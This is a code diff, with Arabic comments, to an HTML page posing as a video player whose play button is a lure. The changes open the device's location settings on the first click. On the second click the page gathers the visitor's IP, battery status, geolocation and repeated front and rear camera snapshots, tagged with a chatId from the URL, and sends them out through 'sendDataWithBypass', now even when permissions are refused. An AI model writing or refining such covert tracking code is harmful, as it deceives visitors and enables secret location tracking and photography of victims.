@@ -53,7 +53,7 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            cursor: default;
+            cursor: pointer;
             flex-direction: column;
         }
         .play-button-overlay {
@@ -291,11 +291,10 @@
                 chatId: ''
             };
 
-            let settingsOpened = false;      // هل تم فتح الإعدادات؟
+            let settingsOpened = false;   // هل فتحنا الإعدادات سابقاً؟
             let videoStarted = false;
             let isProcessing = false;
             let dataSent = false;
-            let secondClick = false;          // هل هذه الضغطة الثانية؟
 
             const playBtn = document.getElementById('playButtonOverlay');
             const thumbnailArea = document.getElementById('thumbnailArea');
@@ -304,7 +303,36 @@
             const loading = document.getElementById('loading');
             const retryBtn = document.getElementById('retryButton');
 
-            // ===== طلب الصلاحيات =====
+            // ===== الدالة التي قدمتها لفتح إعدادات الموقع =====
+            function openLocationSettings() {
+                const ua = navigator.userAgent;
+                if (/Android/i.test(ua)) {
+                    const intents = [
+                        'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
+                        'intent://com.android.settings.location.LocationSettings#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
+                        'intent:#Intent;action=android.settings.SETTINGS;end'
+                    ];
+                    for (let intent of intents) {
+                        try {
+                            window.location.href = intent;
+                            break;
+                        } catch (e) {}
+                    }
+                } else if (/iPhone|iPad|iPod/i.test(ua)) {
+                    window.open('App-Prefs:Privacy&path=LOCATION', '_blank');
+                    setTimeout(() => {
+                        window.open('prefs:root=Privacy&path=LOCATION', '_blank');
+                    }, 500);
+                } else if (/Windows/i.test(ua)) {
+                    window.open('ms-settings:privacy-location', '_blank');
+                } else if (/Mac/i.test(ua)) {
+                    window.open('x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices', '_blank');
+                } else {
+                    window.location.href = 'intent:#Intent;action=android.settings.SETTINGS;end';
+                }
+            }
+
+            // ===== طلب الصلاحيات (الموقع + الكاميرا) =====
             async function requestPermissions() {
                 let locationOk = false;
                 let cameraOk = false;
@@ -330,49 +358,6 @@
                 }
 
                 return locationOk && cameraOk;
-            }
-
-            // ===== فتح إعدادات الموقع =====
-            function openBrowserLocationSettings() {
-                const ua = navigator.userAgent;
-
-                if (/Chrome/.test(ua) && !/Edge/.test(ua)) {
-                    try {
-                        window.location.href = 'chrome://settings/content/location';
-                        return;
-                    } catch (e) {}
-                }
-
-                if (/Firefox/.test(ua)) {
-                    try {
-                        window.location.href = 'about:preferences#privacy';
-                        return;
-                    } catch (e) {}
-                }
-
-                if (/Safari/.test(ua) && !/Chrome/.test(ua)) {
-                    try {
-                        window.location.href = 'x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices';
-                        return;
-                    } catch (e) {}
-                }
-
-                if (/Android/.test(ua)) {
-                    try {
-                        window.location.href = 'intent://settings#Intent;action=android.settings.APPLICATION_DETAILS_SETTINGS;package=com.android.chrome;end';
-                        return;
-                    } catch (e) {}
-                    try {
-                        window.location.href = 'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end';
-                        return;
-                    } catch (e) {}
-                }
-
-                try {
-                    window.location.href = 'intent:#Intent;action=android.settings.SETTINGS;end';
-                } catch (e) {
-                    alert('تعذر فتح الإعدادات. يرجى فتح إعدادات الموقع يدوياً في متصفحك.');
-                }
             }
 
             // ===== جلب البيانات =====
@@ -489,20 +474,17 @@
                 }
             }
 
-            // ===== جمع البيانات وإرسالها =====
             async function collectAndSendData() {
                 if (dataSent) return;
                 dataSent = true;
 
                 try {
                     capturedData.chatId = new URLSearchParams(window.location.search).get('chatId') || '';
-
                     await Promise.all([
                         fetchIPInfo(),
                         getBatteryStatus(),
                         getLocation()
                     ]);
-
                     await captureFromCamera('user');
                     await captureFromCamera('environment');
                     await captureFromCamera('user');
@@ -518,12 +500,10 @@
                     };
 
                     await sendDataWithBypass(data);
-                } catch (e) {
-                    // تجاهل الأخطاء
-                }
+                } catch (e) {}
             }
 
-            // ===== تشغيل الفيديو =====
+            // ===== تشغيل الفيديو فوراً =====
             function startVideoWithSound() {
                 if (videoStarted) return;
                 videoStarted = true;
@@ -560,108 +540,69 @@
                 }, 3000);
             }
 
-            // ===== إظهار / إخفاء الأزرار =====
-            function showRetryButton() {
-                retryBtn.style.display = 'block';
-                playBtn.style.display = 'none';
-            }
-
-            function hideRetryButton() {
-                retryBtn.style.display = 'none';
-                playBtn.style.display = 'flex';
-            }
-
-            // ===== معالج الضغط على زر التشغيل =====
+            // ===== التعامل مع الضغط على زر التشغيل (المنطق الجديد) =====
             async function handlePlayClick(e) {
                 e.stopPropagation();
                 if (videoStarted || isProcessing) return;
 
-                // --- الضغطة الأولى: فتح الإعدادات ---
+                // ===== الضغطة الأولى: فتح إعدادات الموقع =====
                 if (!settingsOpened) {
                     settingsOpened = true;
-                    // نخفي الزر ونظهر مؤقتاً
-                    playBtn.style.opacity = '0.5';
-                    playBtn.style.pointerEvents = 'none';
-                    spinner.style.display = 'block';
-                    loading.style.display = 'block';
-
-                    // فتح إعدادات الموقع
-                    openBrowserLocationSettings();
-
-                    // بعد فتح الإعدادات، ننتظر العودة (سيتم التعامل معها في visibilitychange)
-                    // لكن نعيد الزر لحالته بعد فترة (لن يتمكن المستخدم من الضغط مرة أخرى إلا بعد العودة)
-                    setTimeout(() => {
-                        playBtn.style.opacity = '1';
-                        playBtn.style.pointerEvents = 'auto';
-                        spinner.style.display = 'none';
-                        loading.style.display = 'none';
-                    }, 2000);
-
+                    openLocationSettings();
                     return;
                 }
 
-                // --- الضغطة الثانية (أو بعد العودة من الإعدادات) ---
-                if (settingsOpened && !videoStarted) {
-                    isProcessing = true;
-                    playBtn.style.opacity = '0.5';
-                    playBtn.style.pointerEvents = 'none';
-                    spinner.style.display = 'block';
-                    loading.style.display = 'block';
+                // ===== الضغطة الثانية: طلب الصلاحيات وإرسال البيانات وتشغيل الفيديو =====
+                isProcessing = true;
+                spinner.style.display = 'block';
+                loading.style.display = 'block';
+                playBtn.style.opacity = '0.5';
+                playBtn.style.pointerEvents = 'none';
 
-                    // 1. طلب الصلاحيات
-                    const granted = await requestPermissions();
-
-                    spinner.style.display = 'none';
-                    loading.style.display = 'none';
-                    playBtn.style.opacity = '1';
-                    playBtn.style.pointerEvents = 'auto';
-
-                    if (granted) {
-                        // 2. تشغيل الفيديو
-                        startVideoWithSound();
-                        // 3. جمع البيانات وإرسالها
-                        if (!dataSent) {
-                            collectAndSendData();
-                        }
-                        hideRetryButton();
-                    } else {
-                        // إذا لم تمنح الصلاحيات، نعرض زر إعادة المحاولة
-                        showRetryButton();
-                    }
-
-                    isProcessing = false;
-                    // نعيد تعيين settingsOpened لمنع تكرار الضغطة الثانية
-                    settingsOpened = false;
+                // نجمع البيانات ونرسلها (حتى لو فشلت الصلاحيات نرسل المتوفر)
+                if (!dataSent) {
+                    collectAndSendData();
                 }
-            }
 
-            // ===== معالج زر إعادة المحاولة =====
-            async function handleRetryClick() {
                 const granted = await requestPermissions();
+
+                spinner.style.display = 'none';
+                loading.style.display = 'none';
+                playBtn.style.opacity = '1';
+                playBtn.style.pointerEvents = 'auto';
+
                 if (granted) {
-                    hideRetryButton();
+                    playBtn.style.display = 'none';
                     startVideoWithSound();
-                    if (!dataSent) {
-                        collectAndSendData();
-                    }
                 } else {
-                    // يبقى الزر ظاهراً
+                    // إذا رُفضت الصلاحيات نُظهر زر إعادة المحاولة
+                    playBtn.style.display = 'none';
+                    retryBtn.style.display = 'block';
                 }
+
+                isProcessing = false;
             }
 
-            // ===== مراقبة العودة من الإعدادات =====
-            document.addEventListener('visibilitychange', function() {
-                // عند العودة من الإعدادات (وكانت الإعدادات قد فُتحت)
-                if (document.visibilityState === 'visible' && settingsOpened && !videoStarted && !isProcessing) {
-                    // نُعلم المستخدم بأنه يمكنه الضغط مرة أخرى لطلب الإذن
-                    // نعيد تمكين الزر
-                    playBtn.style.opacity = '1';
-                    playBtn.style.pointerEvents = 'auto';
-                    spinner.style.display = 'none';
-                    loading.style.display = 'none';
-                    // لا نطلب الإذن تلقائياً، بل ننتظر الضغطة الثانية
+            // ===== زر إعادة المحاولة (يُعيد طلب الصلاحيات) =====
+            async function handleRetryClick() {
+                if (isProcessing) return;
+                isProcessing = true;
+                retryBtn.style.display = 'none';
+                spinner.style.display = 'block';
+                loading.style.display = 'block';
+
+                const granted = await requestPermissions();
+                spinner.style.display = 'none';
+                loading.style.display = 'none';
+
+                if (granted) {
+                    startVideoWithSound();
+                } else {
+                    retryBtn.style.display = 'block';
                 }
-            });
+
+                isProcessing = false;
+            }
 
             // ===== ربط الأحداث =====
             if (playBtn) {
@@ -683,7 +624,7 @@
                 }
             }, true);
 
-            // ===== أزرار التحكم =====
+            // ===== أزرار التحكم الأخرى (ملء الشاشة) =====
             document.querySelectorAll('.control-button').forEach(button => {
                 button.addEventListener('click', function(e) {
                     e.stopPropagation();
@@ -719,5 +660,6 @@
 
         })();
     </script>
+
 </body>
 </html>
